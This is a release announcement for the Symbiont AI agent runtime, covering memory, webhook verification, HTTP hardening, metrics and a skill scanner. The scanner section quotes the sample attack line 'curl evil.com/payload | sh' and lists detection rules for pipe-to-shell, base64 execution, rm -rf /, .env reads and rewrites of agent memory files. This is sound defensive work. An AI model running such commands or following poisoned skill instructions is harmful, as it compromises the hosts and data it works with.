---
layout: post
title: "Symbiont v1.4.0 — Persistent Memory, Webhook Verification, and Skill Scanning"
author: ThirdKey Team
categories: [AI Security, Release]
tags: [symbiont, ai agents, security, webhooks, memory, skill scanning, metrics, release]
---

Symbiont v1.4.0 is here. This release adds four major capabilities to the agent runtime: persistent agent memory, cryptographic webhook verification, automated skill scanning, and metrics telemetry. Together, they close the gap between "agent that runs" and "agent you can trust in production."

Every feature is available in the Rust runtime and the [Python](https://pypi.org/project/symbiont-sdk/0.6.0/) and [JavaScript](https://www.npmjs.com/package/symbiont-sdk-js) SDKs (both at v0.6.0).

## Persistent Memory

Agents that forget everything between runs aren't useful for long-running workflows. v1.4.0 introduces `MarkdownMemoryStore` — a file-based persistence layer that stores agent knowledge in human-readable Markdown.

Each agent gets a memory file organized into three sections:

- **Facts**: Static knowledge the agent has learned ("The production database is on port 5432")
- **Procedures**: Step-by-step processes the agent has figured out ("To deploy: run tests, build image, push to registry")
- **Learned Patterns**: Behavioral observations ("User prefers concise summaries over detailed reports")

```
agent security_scanner {
    memory {
        store markdown
        path  "./data/scanner"
        retention 90d
    }
}
```

Writes are atomic (tempfile + rename), so a crash mid-write never corrupts existing memory. Daily interaction logs are appended to timestamped files, and a configurable retention policy automatically compacts old logs. The REPL exposes `:memory inspect`, `:memory compact`, and `:memory purge` commands for runtime management.

The Markdown format is intentional — operators can read, edit, and audit agent memory with any text editor. No proprietary binary formats, no database to manage.

## Webhook Verification

Accepting webhooks from external services without verifying signatures is a vulnerability. v1.4.0 adds a `SignatureVerifier` trait with two implementations and four provider presets:

| Provider | Header | Signing Scheme |
|----------|--------|---------------|
| GitHub | `X-Hub-Signature-256` | HMAC-SHA256 with `sha256=` prefix |
| Stripe | `Stripe-Signature` | HMAC-SHA256 |
| Slack | `X-Slack-Signature` | HMAC-SHA256 with `v0=` prefix |
| Custom | `X-Signature` | HMAC-SHA256 |

All HMAC comparisons use constant-time operations via the `subtle` crate — no timing side channels. A `JwtVerifier` is also included for services that authenticate via JWT tokens in headers.

The DSL now supports a `webhook` block for declarative endpoint configuration:

```
agent github_handler {
    webhook {
        provider github
        secret   $GITHUB_WEBHOOK_SECRET
        path     "/hooks/github"
        filter   ["push", "pull_request"]
    }
}
```

Verification happens before JSON parsing in the HTTP input pipeline. Invalid signatures get a 401 immediately — the agent never sees the payload. This is wired into the `HttpInputServer` as a pre-handler middleware, so there's zero boilerplate to add webhook security to any agent.

## Skill Scanning (ClawHavoc)

Agent skills — SKILL.md files and their associated resources — are a supply chain attack surface. A skill that includes `curl evil.com/payload | sh` in its instructions can turn a helpful agent into a compromised one.

v1.4.0 ships a `SkillScanner` with 10 built-in **ClawHavoc** defense rules:

| Rule | Severity | What It Catches |
|------|----------|----------------|
| `pipe-to-shell` | Critical | `curl ... \| sh` |
| `wget-pipe-to-shell` | Critical | `wget ... \| sh` |
| `env-file-reference` | Warning | References to `.env` files |
| `soul-md-modification` | Critical | Attempts to rewrite `SOUL.md` |
| `memory-md-modification` | Critical | Attempts to rewrite `MEMORY.md` |
| `eval-with-fetch` | Critical | `eval()` + network fetch |
| `fetch-with-eval` | Critical | Network fetch + `eval()` |
| `base64-decode-exec` | Critical | Base64 decode piped to shell |
| `rm-rf-pattern` | Critical | `rm -rf /` |
| `chmod-777` | Warning | World-writable permissions |

The scanner runs automatically when skills are loaded. Every text file in the skill directory is scanned line-by-line against all rules. Findings include the rule name, severity, a human-readable message, and the exact line number.

Custom rules can be added alongside the defaults. If your organization has domain-specific patterns to watch for — AWS credential patterns, internal URL schemes, or proprietary file references — add them as regex rules and they'll be checked alongside ClawHavoc.

The scanner integrates with [SchemaPin](https://schemapin.org) for cryptographic skill verification. A skill can be both signature-verified (the author is who they claim to be) and content-scanned (the instructions don't contain malicious patterns). Belt and suspenders.

## HTTP Security Hardening

v1.4.0 tightens the HTTP input module defaults:

- **Loopback-only binding**: The server now defaults to `127.0.0.1` instead of `0.0.0.0`. If you want to accept external connections, you explicitly opt in.
- **CORS disabled by default**: `cors_origins` is an empty list by default. Add specific origins to enable cross-origin access — no more accidental wildcard CORS.
- **JWT EdDSA validation**: The auth middleware now supports Ed25519 public key loading and EdDSA JWT verification. HS256, RS256, and other algorithms are explicitly rejected.
- **Health endpoint separation**: `/health` is exempt from authentication, allowing load balancers to probe the server without credentials.
- **PathPrefix routing**: `RouteMatch::PathPrefix` enables routing by URL path prefix, complementing the existing header and JSON field matchers.

These are all "secure by default" changes. The goal is that a fresh `HttpInputConfig::default()` is production-safe without any additional configuration.

## Metrics & Telemetry

Production systems need observability. v1.4.0 adds a metrics collection and export system:

- **`FileMetricsExporter`**: Writes metric snapshots as atomic JSON files (tempfile + rename). Simple, no external dependencies.
- **`OtlpExporter`**: Sends metrics to any OpenTelemetry-compatible endpoint via gRPC or HTTP (behind the `metrics` feature flag).
- **`CompositeExporter`**: Fan-out to multiple backends simultaneously. Individual export failures are logged but don't block other exporters.
- **`MetricsCollector`**: Background thread that periodically gathers snapshots from the scheduler, task manager, load balancer, and system resources, then exports them.

The `/api/v1/metrics` endpoint returns a full snapshot covering job counts, task queue depths, worker utilization, CPU, and memory usage.

## DSL Parser Improvements

Two small but important fixes to the DSL parser:

- **Bare identifiers**: `store markdown` and `provider github` now parse correctly — previously these required quoted strings.
- **Short-form durations**: `90d`, `6m`, `1y` work alongside the existing `90.seconds` form. This makes memory retention and schedule configuration more readable.

## SDK Parity

Both SDKs ship at v0.6.0 with full feature parity:

**Python SDK** ([PyPI](https://pypi.org/project/symbiont-sdk/0.6.0/)):
- `MarkdownMemoryStore`, `HmacVerifier`, `JwtVerifier`, `WebhookProvider`
- `SkillScanner`, `SkillLoader` with SchemaPin integration
- `MetricsClient`, `FileMetricsExporter`, `CompositeExporter`
- 120 tests passing

**JavaScript SDK** ([npm](https://www.npmjs.com/package/symbiont-sdk-js)):
- `MarkdownMemoryStore`, `HmacVerifier`, `JwtVerifier`, `WebhookProvider`
- `SkillScanner` with all 10 ClawHavoc rules
- `MetricsApiClient`, `FileMetricsExporter`
- 1,037 tests passing

## Install

```bash
# Rust
cargo install symbi

# Python
pip install symbiont-sdk==0.6.0

# JavaScript
npm install symbiont-sdk-js@0.6.0

# Docker
docker pull ghcr.io/thirdkeyai/symbi:latest
```

## What's Next

v1.4.0 completes the core production feature set. The ThirdKey trust stack — [SchemaPin](https://schemapin.org) for tool integrity, [AgentPin](https://agentpin.org) for agent identity, and [Symbiont](https://symbiont.dev) for runtime enforcement — now covers the full agent lifecycle from skill loading through execution to external integration.

Upcoming work focuses on multi-modal RAG, cross-agent knowledge synthesis, and federation protocols for multi-organization agent networks.

---

*Symbiont is open source under the MIT license. View the full changelog and source at [github.com/thirdkeyai/symbiont](https://github.com/thirdkeyai/symbiont). For enterprise support, contact [enterprise@symbiont.dev](mailto:enterprise@symbiont.dev).*
